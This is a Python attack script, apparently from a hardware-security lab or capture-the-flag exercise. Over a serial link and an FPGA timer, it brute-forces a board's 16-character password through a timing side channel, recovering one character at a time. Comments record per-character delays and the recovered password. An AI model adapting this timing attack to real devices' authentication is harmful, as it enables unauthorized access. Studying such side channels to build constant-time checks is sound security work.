#!/usr/bin/env python3

import math
import serial
import time
import sys
import re
import pdb
import string
import os
import traceback
import itertools
from enum import Enum
import numpy as np
from string import digits, ascii_letters, punctuation
from sklearn.linear_model import LinearRegression
import matplotlib.pyplot as plt

np.set_printoptions(linewidth=100, precision=6)

# Open the serial port
ser = serial.Serial('/dev/ttyUSB1', baudrate=115200)


class Command(Enum):
    SET_PWD = 's'
    GET_PWD = 'g'
    SEND_PWD = 'p'
    RESET = chr(27)


def pwd_failed() -> bool:
    r = b"Please enter the Password:\r\n\x00"
    tty_resp = ser.read(len(r))
    m = b"Password Incorrect.\r\n\x00"
    tty_resp = ser.read(len(m))
    if m == tty_resp:
        return True
    print(f"tty_resp: {tty_resp}")
    return False


def send_reset():
    # print("Resetting board.")
    ser.write(chr(27).encode("ascii"))


def reset():
    send_reset()

    m = b"Please enter the Password:\r\n\x00"
    tty_resp = ser.read(len(m))

    if m != tty_resp:
        raise Exception(f"Failed to reset board, res: '{tty_resp}'")


def send_command(cmd: Command, pwd: str = None):
    s = cmd.value.encode("ascii")
    # print(f"Sending {s}")
    num = ser.write(s)
    if num != 1:
        raise Exception("Failed sending full password")

    if cmd == Command.SEND_PWD and pwd != None:
        raise Exception("Send pwd should not have a password as argument")

    if pwd and cmd == Command.SET_PWD:
        s = pwd.encode("ascii")
        # print(f"Sending {s}")
        num = ser.write(s)
        if num != 16:
            raise Exception("Failed sending full password")

    if cmd == Command.GET_PWD:
        res = ser.read(16)
        return res.decode("ascii")

    return None


def normalize_array(arr):
    arr = np.array(arr)
    normalized_arr = arr / np.linalg.norm(arr, ord=1)
    return normalized_arr


def convert_ns_to_us(ns_array):
    ns_array = np.array(ns_array, dtype=np.float64)
    ms_array = ns_array / 1_000
    return ms_array


SYSTEM_CLOCK = 32000000
BAUD_RATE = 115200
UART_FULL_ETU = (SYSTEM_CLOCK/BAUD_RATE)
UART_HALF_ETU = ((SYSTEM_CLOCK/BAUD_RATE)/2)
TO_US = 1/(SYSTEM_CLOCK/1_000_000)


def to_us(delay):
    return math.floor(delay * TO_US)


def set_delay(delay: int):  # delay in cycles

    print(f"===== Delaying for {delay} cycles=========")
    print(f"===== Delaying for {to_us(delay)} us=========")

    def send_char(c):
        d = c.encode("ascii")
        num = ser.write(d)
        if num != 1:
            raise Exception(f"Failed sending '{c}'")

    send_char('D')  # Reset delay

    if delay > 1000:
        a_count = delay // 1000
        delay = delay % 1000
        for i in range(a_count):
            send_char('a')

    if delay > 100:
        d_count = delay // 100
        delay = delay % 100
        for i in range(d_count):
            send_char('d')

    if delay > 10:
        f_count = delay // 10
        delay = delay % 10
        for i in range(f_count):
            send_char('f')

    if delay > 0:
        v_count = delay
        for i in range(v_count):
            send_char('v')


# Returns time in cycles
def get_time():
    d = 't'.encode("ascii")
    num = ser.write(d)
    if num != 1:
        raise Exception("Failed sending 't'")
    tags = ser.read_until(b'!').decode()
    dollar_count = tags.count('$')*1000
    hash_count = tags.count('#')*100
    dot_count = tags.count('.')*1
    plus_count = tags.count('+')*10

    return hash_count + dot_count + plus_count + dollar_count


def main():
    # [0] -> 92_055 cycles H
    # [1] -> 92_275 cycles 4
    # [2] -> 92_500 cycles r
    # [3] -> 92_450 cycles d
    # start: 2850*32
    # first difference jump seen at: 91476 cycles
    bruteforce_pwd(92_055)
    # bruteforce_pwd(92055, True)

# Wenn ein "p" beim FPGA ankommt dann wird das Board resettet und der timing counter auf 0 gesetzt, und in den RESET_THEN_SEND state gewechselt.
# Im RESET_THEN_SEND state warte ich bis ich 29 Zeichen vom Board empfangen habe also ich warte auf "Please enter the password:"
# danach wechsel ich in den DELAY_SEND state. Im DELAY_SEND state warte ich delay * (`SYSTEM_CLOCK / 1000 / 1000) Zeiteinheiten(Mikrosekunden).
# Danach wechsel ich in den SEND_PWD state.
# Im SEND_PWD state sende ich 16 Zeichen beim 16. gesendetem Zeichen aktiviere ich den timing counter um den Passwort check zu timen
# und gehe in den IDLE state.
# Im IDLE state wird der timer deaktiviert sobald das erste Zeichen vom Board empfangen wurde.


def find_timing(start_delay, offset, index, PWD_ARR):
    CHARS = digits + ascii_letters
    PWD_ARR = PWD_ARR.copy()
    delay = start_delay + offset
    a = 0
    while True:
        print(f"====== FIND TIMING ======. With delay increase: {delay - start_delay} cycles. ")
        set_delay(delay)
        max_index_arr = np.zeros(15, dtype=np.int64)
        variance_arr = np.zeros(len(max_index_arr), dtype=np.int64)
        for b in range(len(max_index_arr)):
            arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)
            for c in range(len(CHARS)):
                PWD_ARR[index] = CHARS[c]
                pwd_str = "".join(PWD_ARR)
                send_command(Command.SET_PWD, pwd_str)
                send_command(Command.SEND_PWD)
                if not pwd_failed():
                    raise Exception("Password was correct")
                dtime = get_time()
                arr_diff_2[0][c] = dtime
                arr_diff_2[1][c] = time.perf_counter_ns()

            y = arr_diff_2[0].copy()
            y -= y.min()
            #mean = arr_diff_2[0].mean()
            #print(f"Mean time: {mean}")
            max_index = np.argmax(y)
            max_index_arr[b] = max_index
            #print(f"{arr_diff_2[0]}")
            #print(f"{y}")
            #print(f"Max index: {max_index}")
            print(f"Correct char: { CHARS[max_index]}")
            if y.max() > 300:
                print("==> Max time is over 300. Seems correct")
                #print(f"{y}")
            variance_arr[b] = np.var(arr_diff_2[0])
            #print(f"Variance: {variance_arr[b]}")

        print("==================================")
        #print(f"Max index arr: {max_index_arr}")
        most_freq = np.bincount(max_index_arr).argmax()
        #print(f"Most frequent: {most_freq}")
        winning_c = CHARS[most_freq]
        print(f"Most frequent character: {winning_c}")

        median_var = np.median(variance_arr)
        print(f"Median variance: {median_var}")

        if np.bincount(max_index_arr).max() >= 10 and median_var > 1000:
            winning_c = CHARS[most_freq]
            print(f"Winning character: {winning_c}")
            a += 1
            return delay
        else:
            delay += 20

        if a == 16:
            print("=====DONE=====")
            break

# H4rdc0r3H4rdw4r3
def bruteforce_pwd(delay, plot=False):
    CHARS = digits + ascii_letters
    PWD_ARR = ['0' for i in range(16)]

    delay = 93_090
    set_delay(delay)
    PWD_ARR[0] = 'H'  # 92_055
    PWD_ARR[1] = '4'  # 92_275
    PWD_ARR[2] = 'r'  # 92_500
    PWD_ARR[3] = 'd'  # 92_450
    PWD_ARR[4] = 'c'  # 92_650
    PWD_ARR[5] = '0'  # 92_920
    PWD_ARR[6] = 'r' # 92_870
    #PWD_ARR[7] = '3' # 93_090
    a = 7
    while True:
        arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)
        pwd_str = "".join(PWD_ARR)
        send_command(Command.SET_PWD, pwd_str)
        print(f"============= Start password: {pwd_str} ============= ")
        time.sleep(0.1)

        max_index_arr = np.zeros(15, dtype=np.int64)
        for b in range(len(max_index_arr)):
            for c in range(len(arr_diff_2[0])):
                PWD_ARR[a] = CHARS[c]
                pwd_str = "".join(PWD_ARR)
                send_command(Command.SET_PWD, pwd_str)
                send_command(Command.SEND_PWD)
                if not pwd_failed():
                    raise Exception("Password was correct")
                dtime = get_time()
                arr_diff_2[0][c] = dtime
                arr_diff_2[1][c] = time.perf_counter_ns()

            # print(f"{arr_diff_2[0]}")
            y = arr_diff_2[0].copy()
            y -= y.min()
            #mean = arr_diff_2[0].mean()
            #print(f"Mean time: {mean}")

            max_index = np.argmax(y)
            max_index_arr[b] = max_index
            #print(f"Max index: {max_index}")
            if y.max() > 300:
                print("==> Max time is over 300. Seems correct")
                #print(f"{y}")
            print(f"Correct char: { CHARS[max_index]}",)
            # print(f"Variance: {np.var(arr_diff_2[0])}")

        #print(f"Max index arr: {max_index_arr}")
        most_freq = np.bincount(max_index_arr).argmax()
        #print(f"Most frequent: {most_freq}")
        winning_c = CHARS[most_freq]
        print(f"Winning character: {winning_c}")
        PWD_ARR[a] = winning_c
        print("New password: " + "".join(PWD_ARR))
        num_winning = np.bincount(max_index_arr).max()
        if num_winning < 6:
            print(f"Num winning is too low: {num_winning} of {len(max_index_arr)}")
            print("============= FAILED ============= ")
            return False

        new_delay = find_timing(delay, 100, a+1, PWD_ARR)
        print(f"Delay diff is: { new_delay - delay}")
        #delay += 200
        set_delay(new_delay)

        if a == 15:
            print("=====DONE=====")
            break

        a += 1
if __name__ == "__main__":
    try:
        main()
    except Exception as ex:
        extype, value, tb = sys.exc_info()
        traceback.print_exc()
        pdb.post_mortem(tb)
